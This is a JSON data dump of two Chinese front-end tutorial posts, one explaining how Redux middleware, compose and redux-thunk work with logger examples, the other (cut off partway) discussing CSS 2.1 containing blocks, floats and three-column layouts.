{"_id":{"$oid":"5a4b765a751bf823c002e922"},"id":"5a4a38d351882527a00fb5a5","author":{"$oid":"5a4b765a751bf823c002e910"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Redux中间件实现机制","meta":{"likeCount":0},"tag":["React.js","Redux","前端","JavaScript"],"comment":[],"shortContent":"Redux 引入中间件机制，其实就是为了在 dispatch 前后，统一“做爱做的事”。。。 例如我想在dispatch(action)发起前打印出日志，发起后再打印出日志以供调试，中间件就是干这事的。 中间件会在每次dispatch的时候执行！！！每次dispatch都会重新…","content":"\u003ch2 class=\"heading\"\u003e中间件解决了什么问题？\u003c/h2\u003e\n\u003cp\u003eRedux 引入中间件机制，其实就是为了在 dispatch 前后，统一“做爱做的事”。。。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e摘自https://github.com/kenberkeley/redux-simple-tutorial/blob/master/redux-advanced-tutorial.md\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e例如我想在dispatch(action)发起前打印出日志，发起后再打印出日志以供调试，中间件就是干这事的。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e中间件实现原理\u003c/h2\u003e\n\u003cp\u003e中间件会在每次dispatch的时候执行！！！每次dispatch都会重新执行一次所有的中间件。由于引入了中间件机制，所以我们可以自己开发中间件，而redux只需要让我们写的中间件执行即可。下面就是\"组装\"第三方中间件成品的方法。\u003c/p\u003e\n\u003cp\u003eapplyMiddleWare.js\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e代码33行:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003efor (var _len = arguments.length, middlewares = Array(_len), _key = 0; _key \u0026lt; _len; _key++) {\n    middlewares[_key] = arguments[_key]; // 将传入的中间件存放到middlewares数组中\n}  \nvar store = createStore(reducer, preloadedState, enhancer);\nvar _dispatch = store.dispatch;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eapplyMiddleWare方法作为createStore的第三个参数，其作用可以认为是用来增强dispatch方法的，所以当applyMiddleWare方法执行时，首先会先创建store对象，然后令_dispatch变量等于原始的dispatch方法。\u003c/p\u003e\n\u003cp\u003e试想：一个成品中间件需要哪些参数？\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003estore对象肯定是需要的，因为总得知道数据是啥才能打印出来的对吧。\u003c/li\u003e\n\u003cli\u003edispatch方法也是需要的，因为我们都任由中间件在做\"他想做的事\"了，中间件当然也不能忘了自己的本职工作: 将dispatch执行到底。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e于是\u003cstrong\u003e代码38行\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003evar middlewareAPI = {\n    getState: store.getState,\n    dispatch: function dispatch(action) {\n    return _dispatch(action);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e创建了一个叫middlewareAPI的对象，提供给各个中间件使用。这个对象包含有store对象核心属性，可以将看做是store的简化版本，\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e下面我们将写个logger中间件以此来看中间件是怎么执行的：\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003elogger中间件：作用就是在dispatch执行前后打印出store的值和action的type\nconst logger = (store) =\u0026gt; (next) =\u0026gt; (action) =\u0026gt;{\n    console.group(action.type)\n    console.info('dispatching', action)\n    let result = next(action)\n    console.log('next state', store.getState())\n      console.groupEnd(action.type)\n     return result\n}\n\n中间件通过如下方式被组装：logger作为参数被传入applyMiddleware方法\nlet store = createStore(reducer,{data1:0},compose(\n    applyMiddleware(logger),\n))\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e下面我们将以logger中间件为例来看他在applyMiddleWare方法中经历了些什么。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e代码45行\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003echain = middlewares.map(function (middleware) {   此处的middleware参数就是我们的logger中间件\n    return middleware(middlewareAPI);\n  });\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到这一步仅仅是将简化版store==\u0026gt;middlewareAPI对象传入了logger中。嘛，不错嘛，现在logger可以拿到store的数据了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e_dispatch = compose.apply(undefined, chain)(store.dispatch);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e代码57行\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e_dispatch = compose.apply(undefined, chain)(store.dispatch);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e全redux最牛叉的一行，就这一行，中间件的组装工作就完事了。完事了。。\u003c/p\u003e\n\u003cp\u003ecompose函数的作用：将上一个函数的执行结果作为参数传递到下个一个函数中去，以此类推。可以认为后面的函数保存着上个函数的闭包。\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a4a4725f265da43163d6c3d\"\u003e详细看这里\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e回到原点，中间件是用来增强dispatch的。所以上面compose初始传入参数为store.dispatch这个最最原始的dispatch方法，然后我们的logger中间件通过next参数接收到了store.dispatch，由于接收到了dispatch这个方法，所以logger这个function胆气很肥，认为老子相当牛啊，\"劫持了\"dispatch这个redux亲儿子方法，那我岂不是可以摇身一变顶替dispatch？so他这样做了。只见，他先是大喊了两声我很正常啊大家都把我就是真正的dispatch方法童叟无欺，然后在合适的时候执行了dispatch()，这样一来大家果然都被骗到了，他真的dispatch并且触发所有的监听函数了耶，他果然是真的。就这样我们的logger中间件狸猫换太子，取代了dispatch方法。但是有个潜在的风险还存在着，如果我们的logger中间件后面还有第二个、第三个中间件，那么logger(老哥)的太子地位又会被第二个中间件给篡夺，然后logger就成了给别的中间件打苦力的了。周而复始，尔虞我诈，黄雀在后，终于有一个中间件成功继承大统，没有人来篡位，他把上一个中间件收拾的服服帖帖，而上一个中间件又将上上个失败者收拾的服服帖帖......最后这个成功者被合到了store身上，成功继承了dispatch之名。由于applyMiddleWare只是增强了dispatch，所以其他的变量一概不动，原样继承，只有dispatch换成了新的。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ereturn _extends({}, store, {\n    dispatch: _dispatch   // 新 dispatch 覆盖原 dispatch，往后调用 dispatch 就会依次触发 chain 内的中间件链式串联执行，最后必定会执行最原始的dispatch(action)\n  });\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 class=\"heading\"\u003e异步action的实现——14行代码就能的7千多颗星的redux-thunk中间件\u003c/h2\u003e\n\u003cp\u003e异步action的使用场景：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2016/09/redux_tutorial_part_two_async_operations.html\"\u003e异步操作至少要送出两个 Action：用户触发第一个 Action，这个跟同步操作一样，没有问题；如何才能在操作结束时，系统自动送出第二个 Action 呢？\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e下面来看看redux-thunk干了什么\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003efunction createThunkMiddleware(extraArgument) {\n  return ({ dispatch, getState }) =\u0026gt; next =\u0026gt; action =\u0026gt; {\n    if (typeof action === 'function') {\n        // 如果redux-thunk中间件检测到action不是一个object，那么不会触发dispatch，而是将dispatch方法传到action方法里，并执行action,由action决定在何时触发dispatch\n      return action(dispatch, getState, extraArgument);\n    }\n\n    return next(action);\n  };\n}\nconst thunk = createThunkMiddleware();\nthunk.withExtraArgument = createThunkMiddleware;\n\nexport default thunk;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e简单的说就是redux-thunk这个中间件讲他劫持到的dispatch方法吐给了用户，让用户决定何时触发，虽然这个dispatch方法就是用户本身触发的。。转手了一圈，又回到用户手里了。最后提一句，thunk中间件最好放在最后面，如果放在前面可能会导致后面的中间件得不到执行。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/mcdyzg/redux-analyse.git\"\u003e代码在这里\u003c/a\u003e  五行缺星\u003c/p\u003e\n\u003cp\u003e参考：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2016/09/redux_tutorial_part_two_async_operations.html\"\u003eRedux 入门教程（二）：中间件与异步操作\u003c/a\u003e\n\u003ca target=\"_blank\" href=\"http://cn.redux.js.org/docs/advanced/AsyncActions.html\"\u003eRedux中文文档\u003c/a\u003e\n\u003ca target=\"_blank\" href=\"https://github.com/kenberkeley/redux-simple-tutorial/blob/master/redux-advanced-tutorial.md\"\u003eRedux 莞式教程。本教程深入浅出，配套入门、进阶源码解读以及文档注释丰满的 Demo 等一条龙服务\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514893441.8186","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3e1"},"id":"5a46981c518825519408f33b","author":{"$oid":"5a4b76338b69bb25d83da3c9"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/30/160a3c22823c8f72?w=1868\u0026h=448\u0026f=png\u0026s=46703","https://user-gold-cdn.xitu.io/2017/11/28/1600316bd8ccd624?w=220\u0026h=220\u0026f=jpeg\u0026s=50577"],"screenShot":null}],"title":"再读规范中浮动与定位细节","meta":{"likeCount":0},"tag":["HTML","CSS","JavaScript","前端"],"comment":[],"shortContent":"如题，浮动与定位是CSS布局中重要且基础知识点，相关规范和书籍都有篇幅解读。但具体细节，笔者初读囫囵吞枣，几经再读受益匪浅。感叹规范，简明扼要，字字珠玑 。借此行文，着笔细节，竭尽所能，力求清晰。不过删繁就简，仍然又臭又长，自嘲厕所文。 在正文开始前，说几句题外话。以CSS 定…","content":"\u003ch4 class=\"heading\"\u003e前言\u003c/h4\u003e\n\u003cp\u003e如题，浮动与定位是\u003ccode\u003eCSS\u003c/code\u003e布局中重要且基础知识点，相关规范和书籍都有篇幅解读。但具体细节，笔者初读囫囵吞枣，几经再读受益匪浅。感叹规范，简明扼要，字字珠玑 。借此行文，着笔细节，竭尽所能，力求清晰。不过删繁就简，仍然又臭又长，自嘲厕所文。\u003c/p\u003e\n\u003cp\u003e在正文开始前，说几句题外话。以\u003ccode\u003eCSS 定位\u003c/code\u003e为例，浏览器搜关键字，点击阅读相关博文，你会发现大多通篇下来只是简单描述  \u003ccode\u003eposition\u003c/code\u003e 属性值，及某种定位规则。其中对包含块（\u003ccode\u003econtaining block\u003c/code\u003e）细节描述几近为零。如若对定位理解仅止步于此心满意足，一味追逐新技术好高骛远，岂不捡了芝麻丢了西瓜，得不偿失。\u003c/p\u003e\n\u003cp\u003e本文参考 \u003ca target=\"_blank\" href=\"https://www.w3.org/TR/2011/REC-CSS2-20110607/\"\u003eCSS 2.1\u003c/a\u003e 规范，主要阐述浮动（\u003ccode\u003efloat\u003c/code\u003e）与定位（\u003ccode\u003eposition\u003c/code\u003e）相关细节，例如包含块定义、浮动细节、三列布局、清除浮动等。如有兴趣，烦请平心，慢慢阅读。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e包含块（containing block）\u003c/h4\u003e\n\u003cp\u003e笔者简单抛出几个问题，包含块定义是什么？建立包含块的元素一定是块级元素吗？包含块区域是由祖先元素的内容边界（\u003ccode\u003econtent edge\u003c/code\u003e）还是内边距边界（\u003ccode\u003epadding edge\u003c/code\u003e）构成？\u003c/p\u003e\n\u003cp\u003e首先来看 \u003ccode\u003eCSS 2.1\u003c/code\u003e 规范对包含块（\u003ccode\u003econtaining block\u003c/code\u003e）描述：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eIn CSS 2.1, many box positions and sizes are calculated with respect to the edges of a rectangular box called a containing block. In general, generated boxes act as containing blocks for descendant boxes; we say that a box \"establishes\" the containing block for its descendants.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e简单翻译，“CSS 2.1中，很多盒的位置和大小是根据被称为包含块的矩形框的边计算的。一般把生成的盒作为后代盒的包含块，我们说一个盒为其后代“建立”了包含块。\u003c/p\u003e\n\u003cp\u003e通俗来讲，包含块（\u003ccode\u003econtaining block\u003c/code\u003e）用来确定元素生成盒位置和大小。比如当元素指定  \u003ccode\u003eposition\u003c/code\u003e 为除 \u003ccode\u003estatic\u003c/code\u003e 外的值时，其偏移属性（\u003ccode\u003eright、top...\u003c/code\u003e）百分比是相对于包含块的宽度或高度计算。参照规范 \u003ca target=\"_blank\" href=\"https://www.w3.org/TR/2011/REC-CSS2-20110607/visudet.html#containing-block-details\"\u003e10.1 Definition of containing block\u003c/a\u003e 章节，为节省篇幅，具体规则如图所示。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"containing-block-details\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a3c2283e533af?w=2302\u0026amp;h=732\u0026amp;f=png\u0026amp;s=89903\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e稍作梳理，要点如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e根元素包含块称为初始包含块，对于连续媒体为视口（\u003ccode\u003eviewport\u003c/code\u003e）尺寸，分页媒体是页区（\u003ccode\u003epage area\u003c/code\u003e）尺寸。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e非根元素且 \u003ccode\u003eposition\u003c/code\u003e 值是 \u003ccode\u003estatic\u003c/code\u003e 或 \u003ccode\u003erelative\u003c/code\u003e，包含块由最近的\u003cstrong\u003e块容器\u003c/strong\u003e（\u003ca target=\"_blank\" href=\"https://www.w3.org/TR/2011/REC-CSS2-20110607/visuren.html#block-boxes\"\u003eblock container \u003c/a\u003e）祖先盒的 \u003cstrong\u003e内容边界\u003c/strong\u003e（content edge）形成。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e如果元素 \u003ccode\u003eposition: fixed\u003c/code\u003e，包含块是由连续媒体的视口或分页媒体的页区建立。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e如果元素 \u003ccode\u003eposition: absolute\u003c/code\u003e，包含块由最近的 \u003ccode\u003eposition\u003c/code\u003e 为 \u003ccode\u003erelative\u003c/code\u003e，\u003ccode\u003eabsolute\u003c/code\u003e 或者 \u003ccode\u003efixed\u003c/code\u003e 的 \u003cstrong\u003e祖先\u003c/strong\u003e （注：未限定是块容器）建立。区分以下情况：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e如果祖先是行内元素，包含块是由该元素生成的第一个和最后一个行内盒的 \u003cstrong\u003e内边距盒\u003c/strong\u003e（padding box）形成。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e否则，包含块由该祖先的 \u003cstrong\u003e内边距边界\u003c/strong\u003e（padding edge）形成。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e根元素和元素为 \u003ccode\u003eposition: fixed\u003c/code\u003e 情况较为简单，前者为后者生成初始包含块。细节在于 \u003ccode\u003estatic 或 relative\u003c/code\u003e 和 \u003ccode\u003eabsolute\u003c/code\u003e 两者差异。\u003ccode\u003estatic 或 relative\u003c/code\u003e 元素包含块为最近的 \u003cstrong\u003e块容器\u003c/strong\u003e 祖先盒的 \u003cstrong\u003econtent edge\u003c/strong\u003e，\u003ccode\u003eabsolute\u003c/code\u003e 元素包含块为最近的 \u003cstrong\u003e非 static 祖先盒\u003c/strong\u003e 的 \u003cstrong\u003epadding edge\u003c/strong\u003e 或 \u003cstrong\u003epadding box\u003c/strong\u003e ，再有 \u003ccode\u003eabsolute\u003c/code\u003e \u003cstrong\u003e并未限定祖先为行内盒或块容器盒\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e对于浮动（\u003ccode\u003efloat\u003c/code\u003e）元素，其包含块是其最近的\u003cstrong\u003e块级祖先\u003c/strong\u003e元素。（参照《CSS 权威指南》浮动与定位章节）\u003c/p\u003e\n\u003cp\u003e包含块（\u003ccode\u003econtaining block\u003c/code\u003e）相关在工作中经常用到，细节熟稔于心才会从容自如。另外前面提及块容器（\u003ccode\u003eblock container box\u003c/code\u003e）的概念以及与块级盒（\u003ccode\u003eblock-level box\u003c/code\u003e）、块盒（\u003ccode\u003eblock box\u003c/code\u003e）的区别可查阅 \u003ca target=\"_blank\" href=\"https://www.w3.org/TR/2011/REC-CSS2-20110607/visuren.html#block-boxes\"\u003e9.2.1  Block-level elements and block boxes\u003c/a\u003e 章节。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e浮动理论\u003c/h4\u003e\n\u003cp\u003e浮动（\u003ccode\u003efloat\u003c/code\u003e）最有意思的特性是其他内容会沿着它的一侧排列。浮动元素会从文档的\u003cstrong\u003e正常流中删除\u003c/strong\u003e，不过还是会影响布局。例如图片浮动时，其他内容会“环绕”该元素。\u003c/p\u003e\n\u003cp\u003e浮动盒之前或之后创建的未定位的（\u003ccode\u003enon-positioned\u003c/code\u003e）块盒会正常排列，但接着浮动盒创建的当前及后续行盒会进行\u003cstrong\u003e必要缩短\u003c/strong\u003e，给浮动盒的 \u003ccode\u003emargin box\u003c/code\u003e 让出空间。位于浮动盒之前的当前行盒里的任何内容都会在浮动盒的另一侧的相同行\u003cstrong\u003e重新排列\u003c/strong\u003e（\u003ccode\u003ereflowed\u003c/code\u003e）。\u003c/p\u003e\n\u003cp\u003e再有浮动元素会为其内容建立一个新的\u003cstrong\u003e块级格式化上下文\u003c/strong\u003e（\u003ccode\u003eblock formatting contexts\u003c/code\u003e）。表格，块级可替换元素或者常规流中建立新的块级格式化上下文的元素（例如一个\u003ccode\u003eoverflow\u003c/code\u003e不为\u003ccode\u003evisible\u003c/code\u003e的元素）不能与同块级格式化上下文中的任何浮动盒的 \u003ccode\u003emargin box\u003c/code\u003e 重叠。\u003c/p\u003e\n\u003cp\u003e提一个问题，当浮动与正常流中的内容发生重叠会怎么样？比如浮动元素存在负外边距则有可能产生重叠。对此 \u003ccode\u003eCSS\u003c/code\u003e 规范指出明确规则：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e行内盒与一个浮动元素重叠时，其边框、背景和内容都在该浮动元素“之上”显示\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e块盒与一个浮动元素重叠时，其边框和背景在该浮动元素“之下”显示，而内容在浮动元素“之上”显示\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e参考示例: \u003ca target=\"_blank\" href=\"https://codepen.io/sunpeijun/pen/dJvOgj\"\u003ehttps://codepen.io/sunpeijun/pen/dJvOgj\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e此外，规范制定详细规则，用来控制浮动行为。如图所示，文字较多，如有兴趣，自行查阅。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"浮动规则\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a3c2283940419?w=1212\u0026amp;h=522\u0026amp;f=png\u0026amp;s=65216\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e上述截取自 \u003ccode\u003eCSS 2.1\u003c/code\u003e 规范 \u003ca target=\"_blank\" href=\"https://www.w3.org/TR/2011/REC-CSS2-20110607/visuren.html#float-position\"\u003e9.5.1 Positioning the float: the float property\u003c/a\u003e 章节。笔墨简短，却层次分明。简述三两条，左浮动盒左外边界或右外边界不能超出包含块的左边界或上边界，多个浮动元素间不会相互重叠等。建议阅读《CSS 权威指南》“第10章 浮动和定位”，有对每条规则详细解读。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e再谈三栏布局\u003c/h4\u003e\n\u003cp\u003e其实空读理论，犹如纸上谈兵。借着三栏布局场景，阐述 \u003ccode\u003efloat\u003c/code\u003e 实现细节。首先限定布局结构：左中右三栏布局，左右两栏宽度固定，中间栏宽度自适应。以笔者所熟知的三栏布局，采用 \u003ccode\u003efloat\u003c/code\u003e 实现可有两种方式：左右两栏浮动、三栏全浮动。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e左右两栏浮动\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 结构 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"left\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"right\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"main\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-comment\"\u003e/* 样式 */\u003c/span\u003e\n \u003cspan class=\"hljs-selector-tag\"\u003ehtml\u003c/span\u003e, \u003cspan class=\"hljs-selector-tag\"\u003ebody\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003emargin\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e; }\n\u003cspan class=\"hljs-selector-class\"\u003e.main\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e; \u003cspan class=\"hljs-attribute\"\u003emargin\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e210px\u003c/span\u003e; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffe6b8\u003c/span\u003e; }\n\u003cspan class=\"hljs-selector-class\"\u003e.left\u003c/span\u003e, \u003cspan class=\"hljs-selector-class\"\u003e.right\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e; \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#a0b3d6\u003c/span\u003e; }\n\u003cspan class=\"hljs-selector-class\"\u003e.left\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left; }\n\u003cspan class=\"hljs-selector-class\"\u003e.right\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: right; }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e参考示例: \u003ca target=\"_blank\" href=\"https://codepen.io/sunpeijun/pen/opZwyr\"\u003ehttps://codepen.io/sunpeijun/pen/opZwyr\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e此种方式关键在于把主体标签放置最后，左右两栏 \u003ccode\u003ediv\u003c/code\u003e 顺序任意。笔者曾尝试调整 \u003ccode\u003emain\u003c/code\u003e 元素顺序，均实验未果。那为什么一定要将主体标签放置最后？\u003c/p\u003e\n\u003cp\u003e规范 \u003ca target=\"_blank\" href=\"https://www.w3.org/TR/2011/REC-CSS2-20110607/visuren.html#flow-control\"\u003e9.5 Floats\u003c/a\u003e 章节，存在一行文字：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eIf there is not enough horizontal room for the float, it is shifted downward until either it fits or there are no more floats present.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e大意，“如果没有足够的水平空间来浮动，它会向下移动，直到空间合适或者不会再出现其它浮动”。结合块级元素会占满整行（\u003ccode\u003e'margin-left' + 'border-left-width' + 'padding-left' + 'width' + 'padding-right' + 'border-right-width' + 'margin-right' = 包含块的宽度\u003c/code\u003e），后置位浮动元素在水平方向没有足够空间，所以不会漂浮上去。假如浮动元素前置脱离正常流，块级元素以浮动元素不存在正常排列。佐以规范辅证：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eSince a float is not in the flow, non-positioned block boxes created before and after the float box flow vertically as if the float did not exist.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e注意 \u003ccode\u003emain\u003c/code\u003e 块盒也可用 \u003ccode\u003eoverflow: hidden\u003c/code\u003e 替代 \u003ccode\u003emargin: 0 210px\u003c/code\u003e。如上节所述，\u003ccode\u003eoverflow\u003c/code\u003e 不为 \u003ccode\u003evisible\u003c/code\u003e 的块盒会建立新的块级格式化上下文（\u003ccode\u003eBFC\u003c/code\u003e），同时不能与自身处于同一块格式化上下文中的任何浮动盒的 \u003ccode\u003emargin box\u003c/code\u003e 重叠。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注：上文引用自规范 \u003ca target=\"_blank\" href=\"https://www.w3.org/TR/2011/REC-CSS2-20110607/visuren.html#floats\"\u003e9.5 Floats\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e三栏全浮动\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e三栏全浮动，有圣杯布局或双飞翼布局两种经典方式。当然实际为实现三栏布局采用上述，难免会有些脱离时代发展。使用绝对定位 或 \u003ccode\u003eflex\u003c/code\u003e布局方式，更优雅且易于理解。这里以双飞翼布局为例，解释其 \u003ccode\u003efloat\u003c/code\u003e 实现细节。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 结构 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"main\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"left\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"right\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-comment\"\u003e/* 样式 */\u003c/span\u003e\n \u003cspan class=\"hljs-selector-tag\"\u003ehtml\u003c/span\u003e, \u003cspan class=\"hljs-selector-tag\"\u003ebody\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003emargin\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e; }\n\u003cspan class=\"hljs-selector-class\"\u003e.main\u003c/span\u003e { \u003cspan 